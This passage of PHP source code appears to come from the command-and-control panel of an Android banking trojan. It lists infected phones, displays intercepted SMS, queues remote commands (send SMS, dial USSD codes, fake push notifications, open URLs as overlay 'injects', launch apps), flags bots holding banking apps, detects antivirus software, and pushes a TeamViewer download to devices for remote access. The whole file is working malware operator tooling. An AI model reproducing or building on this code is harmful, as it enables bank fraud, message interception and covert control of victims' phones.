	<div class='col-md-12 lightText'>
		<input id='chk_silent' type='checkbox' checked name='vnc_silent' /><label for='chk_silent'>&nbsp;&nbsp;Disable Sound & Screen Brightness</label>
		<!-- <br />
		<input id='chk_black' type='checkbox' disabled name='vnc_black' /><label for='chk_black'>&nbsp;&nbsp;Black screen (Hidden only)</label> -->
	</div>
	<!-- <div class='col-md-8 lightText'>
		<label for='chk_silent2'>Reduce Screen Brightness&nbsp;&nbsp;</label><input id='chk_silent2' type='checkbox' checked name='vnc_silent' />
	</div> -->
</div>
<br />
";
		}

		$html = str_replace("%ACTION%", "start_vnc", $html);
		$html = str_replace("%BOT_ID%", $data['bbot_id'], $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", "", $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function draw_sms($data)
	{		
		
		if(isset($data['to_delete']) && sizeof($data['to_delete']))
		{
			$ids = $data['to_delete'];
			foreach($ids as $id)
			{
				$bot_id = $this->db->escape($id);
				
				$sql = "delete from sms where id={$bot_id}";
				//~ echo $sql."<br />";
				$this->db->fetch($sql);
			}
		}
		
		$bot_id2 = $this->db->escape($data['bbot_id']);
		$sms = $this->db->fetch("select * from sms where bot_id={$bot_id2} order by id desc", true);
		
		if(!sizeof($sms))
			return "
			<center style='margin: 40px'><h3 class='block'>SMS Content</h3></center>
			<center style='color: black'>No SMS</center><br /><br />";
		
		$total = sizeof($sms);
		
		$html = "
<style type='text/css'>
TH {
	
	text-align: center;
}

.botstable TR:hover {
	background-color: white;
}
</style>
<script>

function select_all_sms()
{
	$('input[type=\"checkbox\"][name=\"elem_sms_id[]\"]').each(function(a, e){ $(e).prop('checked', !$(e).prop('checked')); })
}

function delete_mass()
{
	if(!confirm('Are you surely want to delete elements?'))
		return
		
	var chks = $('input[type=\"checkbox\"][name=\"elem_sms_id[]\"]:checked')
	if(chks.length == 0)
	{
		show_message(\"Select elements first\", \"error\", true)
		return
	}
	
	var url = \"?a=admin&action=bots&bbot_id={$data['bbot_id']}&page=sms&\";
	for(var i=0;i<chks.length;i++)
		url += \"to_delete[]=\" + $(chks[i]).val() + \"&\"

	location.href = url
}

</script>

		<center><h3 class='block'>Intercepted SMS ({$total} records)</h3></center>

	<button class='btn btn-info' onclick='select_all_sms()'>Select&nbsp;all</button>
&nbsp;&nbsp;
	<button class='btn btn-danger' onclick='delete_mass()'>Delete selected</button>
	
		<br />
		<br />
		<table border='0' style='width: 100%; margin: 0 auto' class='table table-bordered botpage_table'>
		<tr>
		<th>&nbsp;</th>
		<th>Number</th>
		<th>Time</th>
		<th>Text</th>
		</tr>";
		
		foreach($sms as $s)
		{
			$html .= "
			<tr>
				<td style='width: 50px'>
				#{$s['id']}<br />
				<input type='checkbox' name='elem_sms_id[]' value='{$s['id']}' title='{$s['id']}' />
				</td>
				<td style='width: 150px'>{$s['number']}</td>
				<td style='width: 150px'>{$s['time']}</td>
				<td>{$s['msg']}</td>
			</tr>
			";
		}
		
		$html .= "</table>
";
		return $html;
	}

	function draw_push($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Send Push Notification to Bot";
			$singleVis = "";
		}else{
			$title = "Send Push Notification to <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->send_push_POST($ids, $_POST['push_title'], $_POST['push_text'], $_POST['push_pkg']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$content = "
<p class='lightText'>Title: <input type='text' class='form-control' name='push_title' placeholder='Whatsapp alert' /></p>
<p class='lightText'>Text: <input type='text' class='form-control' name='push_text' placeholder='' /></p>
<p class='lightText'>App to open (optional): <input type='text' class='form-control' name='push_pkg' placeholder='com.whatsapp' /></p>";
		}
		
		$html = str_replace("%ACTION%", "push", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function send_push_POST($ids, $title, $text, $pkg)
	{
		$title = trim($title);
		$text = trim($text);
		$pkg = trim($pkg);

		if($title == "" || $text == "")
			return [false, $this->msg_err('Error: Title or Text can not be empty', false)];

		$param = $this->db->escape("{$title}|{$text}|$pkg");
		
		foreach($ids as $id)
		{
			if(!trim($id)) continue;

			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'push', {$param}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}

	function draw_ussd($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Send USSD to Bot";
			$singleVis = "";
		}else{
			$title = "Send USSD to <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->send_ussd_POST($ids, $_POST['ussd_code']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$content = "<p class='lightText'>USSD Code:<br />
			<input type='text' class='form-control' name='ussd_code' placeholder='*111#' /></p>";
		}
		
		$html = str_replace("%ACTION%", "ussd", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function send_ussd_POST($ids, $ussd)
	{
		$ussd = trim($ussd);

		if($ussd == "")
			return [false, $this->msg_err('Error: USSD code can not be empty', false)];

		$ussd = $this->db->escape($ussd);
		
		foreach($ids as $id)
		{
			if(!trim($id)) continue;

			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'ussd', {$ussd}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}
	
	function clean_ids($ids)
	{
		$parts = explode(",", $ids);
		$ids = [];
		foreach($parts as $part)
			if(trim($part) != "")
				$ids[] = trim($part);

		$ids = array_unique($ids);
		return $ids;
	}
	
	function draw_send_sms($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Send SMS to Bot";
			$singleVis = "";
		}else{
			$title = "Send SMS to <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->send_sms_POST($ids, $_POST['phone'], $_POST['text']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$content = "<p class='lightText'>Number:<br />
			<input type='text' class='form-control' name='phone' placeholder='1555666222' /></p>
			
			<p class='lightText'>Text: <br />
			<textarea name='text' class='form-control' placeholder='Hello ...'></textarea>
			</p>";
		}
		
		$html = str_replace("%ACTION%", "send_sms", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function send_sms_POST($ids, $phone, $text)
	{
		$phone = trim($phone);
		$text = trim($text);
		
		if(strlen($phone) < 2)
			return [false, $this->msg_err('Error: Number can not be shorter than 2 digits', false)];

		if($phone == "" || $text == "")
			return [false, $this->msg_err('Error: Number or Text can not be empty', false)];
		
		$sms_data = $this->db->escape($phone ."|". $text);

		foreach($ids as $id)
		{
			if(!trim($id)) continue;
			
			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'sms', {$sms_data}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}
	
	function draw_open_url($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Open URL";
			$singleVis = "";
		}else{
			$title = "Open URL on <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->open_url_POST($ids, $_POST['url'], $_POST['open_type']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{
			$tv_url = "https://play.google.com/store/apps/details?id=com.teamviewer.quicksupport.market";
			$content = "<p class='lightText'>URL:<br />
			<input id='url_place' type='text' class='form-control' name='url' placeholder='https://test.com/' /></p>
			
			<table border='0' width='100%'>
				<tr>
<td class='lightText'>Open</td>
<td class='lightText'><input type='radio' name='open_type' value='inject' checked id='type1' /><label for='type1'>&nbsp;&nbsp;&nbsp;as inject</label></td>
<td class='lightText'><input type='radio' name='open_type' value='browser' id='type2' /><label for='type2'>&nbsp;&nbsp;&nbsp;in system browser</label></td>
				</tr>
			</table>
			<br />
			<p><button type='button' class='btn btn-success' onclick='$(\"#url_place\").val(\"{$tv_url}\")'>Set Teamviewer URL</button></p>
			</p>";
		}
		
		$html = str_replace("%ACTION%", "open_url", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function draw_show_inject($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Show inject";
			$singleVis = "";
		}else if($sz == 0){
			
			return "";
		}else{
			$title = "Show inject on <span style='color: #5bc0de'>{$sz}</span> bots";
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->show_inject_POST($ids, $_POST['pkg']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{

			$sm = new Smarts($this->db);
			$smarts = $sm->get_bot_smarts($ids, "list");
			
			if(sizeof($smarts))
			{
				$options = "";
				$options_specials = "";
				foreach($smarts as $group => $pkgs)
				{
					$gr = "<optgroup label='".strtoupper($group)."'>";
					
					foreach($pkgs as $pkg)
					{
						if(array_key_exists($pkg, Bots::$special_injects))
							$tit = Bots::$special_injects[$pkg];
						else
							$tit = $pkg;
						
						$gr .= "<option value='{$pkg}'>{$tit}</option>";
					}
					
					$gr .= "</optgroup>";
					
					if($group == "specials")
						$options_specials .= $gr;
					else
						$options .= $gr;
				}
				
				$content = "<p class='lightText'>Choose Inject:<br />
			<select class='form-control' name='pkg'>
				{$options_specials}
				{$options}
			</select></p>
			</p>";
			}else{
				$content = "<p class='lightText text-center'>No injects found</p>";
				$formButtsVis = "hidden";
			}
			
		}
		
		$html = str_replace("%ACTION%", "show_inject", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function draw_run_app($data)
	{
		$html = file_get_contents('tpls/command_form.html');
		$backButtonVis = "hidden";
		$singleVis = "hidden";
		$formButtsVis = "";
		
		$ids = $this->clean_ids($data['bbot_id']);
		$sz = sizeof($ids);
		
		if($sz == 1)
		{
			$title = "Run app by package name";
			$singleVis = "";
			
			$bot_id2 = $this->db->escape($data['bbot_id']);
			$sql = "SELECT apps from bots where bot_id={$bot_id2}";
			
			$res = $this->db->fetch($sql, true);
			$apps_arr = apps2array($res[0]['apps']);
			
		}else{
			$title = "Run app on <span style='color: #5bc0de'>{$sz}</span> bots";
			
			$in = "";
			foreach($ids as $b)
				$in .= $this->db->escape($b) . ",";
			
			$in = substr($in, 0, strlen($in)-1);
			$sql = "SELECT apps from bots where bot_id in({$in})";
			$res = $this->db->fetch($sql, true);
			
			if(!sizeof($res)) return [];
			
			$apps = [];
			foreach($res as $row)
			{
				$apps = array_merge($apps, apps2array($row['apps']));
			}

			$apps_arr = array_unique($apps);
			
		}
		
		if($_POST)
		{
			list($isSuccess, $content) = $this->run_app_POST($ids, $_POST['pkg']);
			$backButtonVis = "";
			$formButtsVis = "hidden";
			
		}else{

			$apps_opts = "";
			if(sizeof($apps_arr))
			{
				foreach($apps_arr as $app)
					$apps_opts .= "<option value='{$app}'>{$app}</option>";
			}
			
			$content = "<p class='lightText'>Choose app:<br />
			<select id='pkgSel' class='form-control'
			 onclick='$(\"#pkgName\").val($(\"#pkgSel\").val())'
			>{$apps_opts}</select>
			</p>
			<p class='lightText'>
			Or type here:
			<input id='pkgName' type='text' name='pkg' class='form-control' />
			</p>";
		}
		
		$html = str_replace("%ACTION%", "run_app", $html);
		$html = str_replace("%BOT_ID%", implode(",", $ids), $html);
		$html = str_replace("%TITLE%", $title, $html);
		$html = str_replace("%CONTENT%", $content, $html);
		$html = str_replace("%BACK_BUTTON_VIS%", $backButtonVis, $html);
		$html = str_replace("%SINGLE_BOT_VIS%", $singleVis, $html);
		$html = str_replace("%FORM_BUTTS_VIS%", $formButtsVis, $html);
		
		return $html;
	}
	
	function open_url_POST($ids, $url, $in_browser)
	{
		$url = trim($url);

		if($url == "")
			return [false, $this->msg_err('Error: URL can not be empty', false)];
		
		if(!startsWith($url, "http://") && !startsWith($url, "https://"))
			$url = "http://" . $url;

		if($in_browser == "browser")
		{
			$data = $this->db->escape("BROWSER|" . $url);
		}else{
			$data = $this->db->escape($url);
		}

		foreach($ids as $id)
		{
			if(!trim($id)) continue;
			
			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'open_url', {$data}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}
	
	function show_inject_POST($ids, $pkg)
	{
		$pkg = trim($pkg);

		if($pkg == "")
			return [false, $this->msg_err('Error: Package name can not be empty', false)];

		$data = $this->db->escape($pkg);
		$sm = new Smarts($this->db);
		
		foreach($ids as $id)
		{
			if(!trim($id)) continue;
			
			$sm->enable($id, $pkg);
			
			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'show_inject', {$data}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}
	
	function run_app_POST($ids, $pkg)
	{
		$pkg = trim($pkg);

		if($pkg == "")
			return [false, $this->msg_err('Error: Package name can not be empty', false)];
		
		if(!strstr($pkg, "."))
			return [false, $this->msg_err('Error: Invalid package name', false)];

		$data = $this->db->escape($pkg);

		foreach($ids as $id)
		{
			if(!trim($id)) continue;
			
			$bot_id = $this->db->escape($id);
			$sql = "insert into bots_tasks values(null, {$bot_id}, 'run_app', {$data}, 'waiting')";
			//var_dump($sql);
			$this->db->fetch($sql);
		}
		
		if(sizeof($ids) == 1)
			return [true, $this->msg_ok("Task added to the Bot Task list", true)];
		else
			return [true, $this->msg_ok(sizeof($ids) . " tasks added to the Bot Task list", true)];
	}


	function get_limit($total_rows, $rows_on_page, $page)
	{
		$paging = array(
			'total_rows' => $total_rows,
			'pages' => 1,
			'page' => 1,
			'sql' => '',
		);
		
		if ($total_rows < $rows_on_page)
			return $paging;
		
		$num_pages = $total_rows / $rows_on_page;
		$num_pages = round($num_pages);
			
		if($num_pages < 2)
			$num_pages = 0;

		$paging['page'] = $page;
		
		// if page in cookies larger than real elements count
		if($paging['page']*$rows_on_page > $total_rows)
			$paging['page'] = 1;
			
		$limit_from = ($paging['page'] - 1) * $rows_on_page;
		if($limit_from < 0)
			$limit_from = 0;
			
		// mod to merge pages
		// 10+10+2 (3 pages) -> 10+12 (2 pages)
		if(($limit_from + $rows_on_page*2) > $total_rows)
			$rows_on_page = $total_rows;

									//~ if($rows_on_page*$num_pages > $total_rows)
										//~ $num_pages--;
		// mod end
		
		if($num_pages == 0) $num_pages++;
		
		$paging['pages'] = $num_pages;
		$paging['sql'] = " LIMIT {$limit_from}, {$rows_on_page}";

		return $paging;
	}

	function draw_list($data)
	{
		$html = file_get_contents("tpls/bots.html");
		
		if(isset($data['to_delete']) && sizeof($data['to_delete']))
		{
			$ids = $data['to_delete'];
			foreach($ids as $id)
			{
				$this->delete_bot($id);
			}
		}
		
		$html = $this->get_filter_and_bots_list($html, $data);
		return $html;
	}
	
	function get_filter_and_bots_list($html, $data)
	{
		################################################## FILTER #######################################
		
		$page = 0;
		$comment = "";
		$with_banks_only = $alive_only = $activated_only = $non_desired_apps_checked = 0;
		
		if(isset($data['set_filter']))
		{
			if(isset($data['page_number']))
				$page = (int) $data['page_number'];
			else
				$page = 0;
				
			$comment = trim($data['comment']);
			$with_banks_only = (isset($data['with_banks_only']))? 1 : 0;
			$alive_only = (isset($data['alive_only']))? 1 : 0;
			$activated_only = (isset($data['activated_only']))? 1 : 0;
			$non_desired_apps_checked = (isset($data['non_desired_only']))? 1 : 0;

			$ip = (isset($data['ip']))? $data['ip'] : "";
		}
		
		$where = " ";
		
		$sql = "select count(id) from bots {$where}";
		$bots = $this->db->fetch($sql, true);
		$total_bots = $bots[0]['count(id)'];

		$no_bots_hide = ($total_bots == 0)? "display: none" : "";
		
		$banks_checked = ($with_banks_only)? " checked " : "";
		$alive_checked = ($alive_only)? " checked " : "";
		$activated_checked = ($activated_only)? " checked " : "";
		$non_desired_apps_checked = ($non_desired_apps_checked)? " checked " : "";

		$sql = "SELECT count(*) FROM bots WHERE bot_id in(select bot_id from smarts_data group by bot_id);";
		$tmp = $this->db->fetch($sql, true);
		$total_w_banks = $tmp[0]['count(*)'];

		$where = '';

		if($alive_checked)
		{
			if($where != "") $where .= " AND ";
			$where .= " last_seen > NOW() - INTERVAL 5 MINUTE "; // ".Bots::LAST_SEEN_HOURS." HOUR
		}
		
		if($activated_checked)
		{
			if($where != "") $where .= " AND ";
			$where .= " extra_info_json like('%HAS_ACSB\":1%') ";
		}
		
		if(isset($data['comment']))
		{
			$c = trim($data['comment']);
			
			if($c)
			{
				$c = mb_substr($this->db->escape($c), 1, mb_strlen($c));
				if($where != "") $where .= " AND ";
				$where .= "comment like('%{$c}%') ";
			}
		}

		$bot_id_filtered = '';
		if(isset($data['bot_id_filtered']))
		{
			$bot_id_filtered = $data['bot_id_filtered'];
			$c = $this->db->escape($data['bot_id_filtered']);
			
			if($bot_id_filtered)
			{
				if($where != "") $where .= " AND ";
				$where .= " bot_id={$c} ";
			}
		}

		$tag = '';
		if(isset($data['tag']))
		{
			$tag = $data['tag'];
			if(trim($tag))
			{
				$tag_clean = $this->db->escape($tag);
				if($where != "") $where .= " AND ";
				$where .= " tag={$tag_clean} ";
			}
		}

		$country = "all";
		if(isset($data['country']))
		{
			$country = $data['country'];
			
			if($country != "all")
			{
				if($where != "") $where .= " AND ";
				$where .= " country=" . $this->db->escape($country) . " ";
			}
		}

		$ip = '';
		if(isset($data['ip']))
		{
			$ip = $data['ip'];
			
			if($ip){
				$ip_clean = mb_substr($this->db->escape($ip), 1, mb_strlen($ip));
				
				// select * from bots where (is_device_admin=0) AND (ip like('%.103%') or bot_id like('%de33f8e0c53%') or apps like('%com.xxx|%'));
				
				if($where != "")
				{
					$where = " (" . $where . ") AND ";
				}
				
				$where .= " ( ip like('%{$ip_clean}%') or bot_id like('%{$ip_clean}%') or apps like('%{$ip_clean}|%') )";
			}
		}
		
		
		$non_desired_only = false;
		if(isset($data['non_desired_only']))
		{
			$non_desired_only = true;
		}

		if($where != "") $where = " where " . $where;
		$sql = "select * from bots {$where} order by id desc";
		//~ var_dump($sql);die;
		$recs = $this->db->fetch($sql, true);
		$total = sizeof($recs);
		
		$rows_on_page = (isset($_GET['rows']))? (int) $_GET['rows'] : 40;
		$paging = $this->get_limit($total, $rows_on_page, $page);
		//~ print_r($paging); // Array ( [total_rows] => 178 [pages] => 4 [page] => 0 [sql] => LIMIT 0, 40 ) 
		
		$limit = $paging['sql'];
		
		if($with_banks_only)
			$limit = ""; // no limits, show all with banks
		
		# ========= sort by ==========
		
		$sorts = array('last_seen_desc', 'last_seen_asc', 'registered_desc', 'registered_asc');
		// 'id_desc', 'id_asc', 
		$sort_by = 'last_seen_desc'; // default sort of bots
		if(isset($data['sort_by']) && in_array($data['sort_by'], $sorts))
			$sort_by = $data['sort_by'];
		
		$sort_by_sql = str_replace("_desc", " desc", $sort_by);
		$sort_by_sql = str_replace("_asc", " asc", $sort_by_sql);
		
		$sort_opts = "";
		foreach($sorts as $s)
		{
			$sel = ($s == $sort_by)? "selected" : "";
			$name = str_replace("_asc", " old first", $s);
			$name = str_replace("_desc", " new first", $name);
			//echo $name;
			$sort_opts .= "<option value='{$s}' {$sel} >{$name}</option>";
		}
		
		
		
		## ===========
		
		
		$sql = "select * from bots {$where} order by {$sort_by_sql} {$limit}";
		$recs = $this->db->fetch($sql, true);

		//echo $sql;

		$pages_list = "";
		
		for($i=1;$i<=$paging['pages'];$i++)
		{
			$pp = $i+1;
			$sel = ($page == $i)? "selected" : "";
			$pages_list .= "<option {$sel} value='{$i}'>{$i}</option>";
		}
		
		$rows_list = "";
		
		foreach(array(10, 100, 500, 1000) as $n)
		{
			$sel = ($rows_on_page == $n)? "selected" : "";
			$rows_list .= "<option {$sel} value='{$n}'>{$n}</option>";
		}
		
		if($where == "")
			$sql = "select count(*) from bots where last_seen > NOW() - INTERVAL ".Bots::LAST_SEEN_HOURS." HOUR {$where}";
		else
			$sql = "select count(*) from bots {$where} AND last_seen > NOW() - INTERVAL ".Bots::LAST_SEEN_HOURS." HOUR";
		
		$alive_total = $this->db->fetch($sql, true)[0]['count(*)'];
		
		$one_percent = $total/100;
		if($one_percent == 0 || $alive_total == 0)
			$alive_percent = 0;
		else
			$alive_percent = round($alive_total/$one_percent, 1);
		
		## ---------- tag filter
		
		$sql = "select tag, count(*) from bots group by tag";
		$tags_recs = $this->db->fetch($sql, true);
		//echo $sql;

		//print_r($tags_recs);
		$tags_list = "<option value=''>All tags</option>";
		foreach($tags_recs as $rec)
		{
			$t = $rec['tag'];
			$count = $rec['count(*)'];
			$sel = ($tag == $t)? "selected" : "";
			$tags_list .= "<option {$sel} value='{$t}'>{$t} ({$count})</option>";
		}
		
		## ---------- country filter
		
		$sql = "select country, count(*) from bots group by country";
		$country_recs = $this->db->fetch($sql, true);
		//~ echo $sql;

		//print_r($country_recs);
		$country_list = "<option value='all'>All countries</option>";
		foreach($country_recs as $rec)
		{
			$t = $rec['country'];
			$count = $rec['count(*)'];
			$sel = ($country == $t)? "selected" : "";
			
			$t_up = ($t == "")? '?' : strtoupper($t);
			$country_list .= "<option {$sel} value='{$t}'>{$t_up} ({$count})</option>";
		}
		
		## ------- macroses bots.html

		$html = str_replace("%COMMENT%", str_replace("'", '"', $comment), $html);
		$html = str_replace("%BANKS_CHECKED%", $banks_checked, $html);
		$html = str_replace("%ALIVE_CHECKED%", $alive_checked, $html);
		$html = str_replace("%NON_DESIRED_ONLY_CHECKED%", $non_desired_apps_checked, $html);
		$html = str_replace("%ACTIVATED_CHECKED%", $activated_checked, $html);
		$html = str_replace("%SORT_OPTS%", $sort_opts, $html);
		$html = str_replace("%TAGS_OPTS%", $tags_list, $html);
		$html = str_replace("%COUNTRY_OPTS%", $country_list, $html);
		$html = str_replace("%PAGES_TOTAL%", $paging['pages'], $html);
		$html = str_replace("%PAGES_LIST%", $pages_list, $html);
		$html = str_replace("%ROWS_LIST%", $rows_list, $html);
		
		$html = str_replace("%PAGE_NUMBER%", $page, $html);
		$html = str_replace("%ROWS_NUMBER%", $rows_on_page, $html);
		
		$html = str_replace("%TOTAL%", $total, $html);
		$html = str_replace("%TOTAL_WITH_BANKS%", $total_w_banks, $html);
		$html = str_replace("%ALIVE_TOTAL%", $alive_total, $html);
		$html = str_replace("%ALIVE_PERC%", $alive_percent, $html);
		$html = str_replace("%NO_BOTS_HIDE%", $no_bots_hide, $html);
		$html = str_replace("%IP%", $ip, $html);

		if(!sizeof($recs))
			return str_replace("%BOTS_TABLE%", "<br /><center>No bots yet</center>", $html);

		if($non_desired_only)
		{
			$desired_apps = $this->get_desired_apps_list();
		}
		
		$bots_html = "<table class='table table-bordered'>";
		foreach($recs as $bot)
		{
			if(!SKIP_FILTER && 
				!strstr($tag, "DONOTFILTER") && 
				$bot['country'] != "" 
				&& stristr(",".FORBIDDEN_COUNTRIES.",",  ",".$bot['country'].",")
			)
				continue; 

			$bot_id = $bot['bot_id'];

			if($with_banks_only)
			{
				$sql = "select count(id) from smarts_data where bot_id='{$bot_id}'";
				$check = $this->db->fetch($sql, true);
				if($check[0]['count(id)'] == 0)
					continue; // has no banks
			}
			
			if($alive_only)
			{
				$d = date_create($bot['last_seen']);
				$ts = $d->getTimestamp();
				
				if((time()-$ts) > 60*60*24)
					continue;
			}

			if($non_desired_only)
			{
				if($this->check_desired_apps($bot['apps'], $desired_apps))
				{
					continue; // show non-desired only
				}
			}
			
			$bot_row_html = file_get_contents("tpls/bot_row.html");
			$bots_html .= $this->make_bot_info_block($bot, $bot_row_html);
		}
		
		$bots_html .= "</table>";
		
		$html = str_replace("%BOTS_TABLE%", $bots_html, $html);


		return $html;
	}
	
	function has_av_apps($bot_id, $installed_apps)
	{
		$installed_apps .= "|";
		
		$av_apps = package_list_to_array(file_get_contents("../static/avs_list.txt"));
		
		if(!sizeof($av_apps)) return "AV list not loaded";
		
		$apps = [];
		$apps_n = 0;
		foreach($av_apps as $d)
			if(strstr($installed_apps, strtolower($d)."|"))
			{
				$apps[] = $d;
				$apps_n++;
			}

		if($apps_n == 0) return "";
		
		$html = "<span class='fold_list_title' onclick='$(\"#fold_2_{$bot_id}\").toggle()'>Antiviruses ({$apps_n})</span><br /><span  id='fold_2_{$bot_id}' class='foldedList blackOL'><ul><li>" . implode("</li><li>", $apps) . "</li></ul></span>";
		return $html;
	}
	
	function check_desired_apps($installed_apps, $desired_apps)
	{
		foreach($desired_apps as $app)
		{
			if(strstr($installed_apps, $app."|")) 
			{
				return true;
			}
		}

		return false;
	}
	
	function get_desired_apps_list()
	{
		$desired_apps = $this->db->fetch("select value from config where name='desired_apps'", true)[0]['value'];
		if($desired_apps == "") return [];
		
		$desired_list = explode("\n", $desired_apps);
		$desired_list = array_filter($desired_list);

		$desired_list = array_unique($desired_list);
		return $desired_list;
	}
	
	// the same code in get_desired_apps()   !
	function has_desired_apps($bot_id, $installed_apps)
	{
		$installed_apps .= "|";
		
		$desired_apps = $this->db->fetch("select value from config where name='desired_apps'", true)[0]['value'];
		if($desired_apps == "") return "<p></p>";
		
		$desired_list = explode("\n", $desired_apps);
		$desired_list = array_filter($desired_list);
		
		# add injects to list of desired apps
		#$desired_list
		//~ $injs = glob("../wi/*"); // use scanInjects(path) !
		//~ if(sizeof($injs))
		//~ foreach($injs as $d)
		//~ if(is_dir($d))
		//~ {
			//~ $pc = explode("/", $d);
			//~ $name = array_pop($pc);
			//~ if(!strstr($name, ".")) continue;
			
			//~ $desired_list[] = $name;
		//~ }
		//~ $injs = $this->db->fetch("select pkg from injects where enabled=1", true);
		//~ if(sizeof($injs)) foreach($injs as $i)
			//~ $desired_list[] = $i['pkg'];

		$desired_list = array_unique($desired_list);

		$apps_n = 0;
		$apps = array();
		foreach($desired_list as $d)
			if(strstr($installed_apps, $d."|"))
			{
				$apps[] = $d;
				$apps_n++;
			}
		
		if($apps_n == 0)
			return "<span class='text-center'>No desired apps</span><br />";
		else
